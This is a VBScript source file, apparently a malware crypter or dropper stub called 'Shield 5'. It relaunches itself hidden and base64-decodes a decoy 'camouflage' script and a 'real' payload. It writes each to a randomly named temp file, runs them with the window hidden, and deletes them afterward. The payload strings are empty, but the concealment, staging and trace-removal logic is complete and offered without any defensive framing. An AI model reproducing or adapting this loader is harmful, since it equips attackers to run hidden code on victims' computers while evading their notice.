
' Shield 5 Final VBS Wrapper
Option Explicit
Dim objShell_S5, objFSO_S5, tempFile_S5, camouflageFile_S5
Set objShell_S5 = CreateObject("WScript.Shell")
Set objFSO_S5 = CreateObject("Scripting.FileSystemObject")

Dim encodedData_S5, camouflageData_S5
camouflageData_S5 = ""
encodedData_S5 = ""

If InStr(1, WScript.FullName, "cscript", vbTextCompare) = 0 Then
    objShell_S5.Run "cscript.exe //nologo """ & WScript.ScriptFullName & """", 0, False
    WScript.Quit
End If

camouflageFile_S5 = objFSO_S5.GetSpecialFolder(2) & "\~camouflage_s5_" & Timer() & Int(Rnd()*1000) & ".vbs"
Dim camouflageContent_S5
camouflageContent_S5 = DecodeBase64_S5(camouflageData_S5)
Call WriteAndRun_S5(camouflageFile_S5, camouflageContent_S5, False, 10000)

tempFile_S5 = objFSO_S5.GetSpecialFolder(2) & "\~real_s5_" & Timer() & Int(Rnd()*1000) & ".vbs"
Dim realContent_S5
realContent_S5 = DecodeBase64_S5(encodedData_S5)
Call WriteAndRun_S5(tempFile_S5, realContent_S5, True, 0)

On Error Resume Next
If objFSO_S5.FileExists(tempFile_S5) Then objFSO_S5.DeleteFile tempFile_S5, True
If objFSO_S5.FileExists(camouflageFile_S5) Then objFSO_S5.DeleteFile camouflageFile_S5, True
On Error GoTo 0
Set objShell_S5 = Nothing : Set objFSO_S5 = Nothing

Sub WriteAndRun_S5(filePath, content, wait, sleepMs)
    On Error Resume Next
    If Len(content) = 0 Then Exit Sub
    Dim fileObj_Sub_S5
    Set fileObj_Sub_S5 = objFSO_S5.CreateTextFile(filePath, True, True) 
    fileObj_Sub_S5.Write content
    fileObj_Sub_S5.Close
    objShell_S5.Run "cscript.exe //nologo """ & filePath & """", 0, wait
    If sleepMs > 0 Then WScript.Sleep sleepMs
End Sub

Function DecodeBase64_S5(base64String)
    On Error Resume Next
    DecodeBase64_S5 = "" 
    Dim domObj_S5, elem_S5
    Set domObj_S5 = CreateObject("MSXML2.DOMDocument.6.0")
    Set elem_S5 = domObj_S5.createElement("Base64Data")
    elem_S5.dataType = "bin.base64"
    elem_S5.text = base64String
    
    Dim streamObj_S5
    Set streamObj_S5 = CreateObject("ADODB.Stream")
    streamObj_S5.Type = 1 
    streamObj_S5.Open
    streamObj_S5.Write elem_S5.nodeTypedValue 
    streamObj_S5.Position = 0
    streamObj_S5.Type = 2 
    streamObj_S5.Charset = "utf-8"
    DecodeBase64_S5 = streamObj_S5.ReadText
    streamObj_S5.Close
    Set streamObj_S5 = Nothing
    Set elem_S5 = Nothing
    Set domObj_S5 = Nothing
    If Err.Number <> 0 Then DecodeBase64_S5 = "' Error decoding Base64 in Shield 5: " & Err.Description : Err.Clear
    On Error GoTo 0
End Function


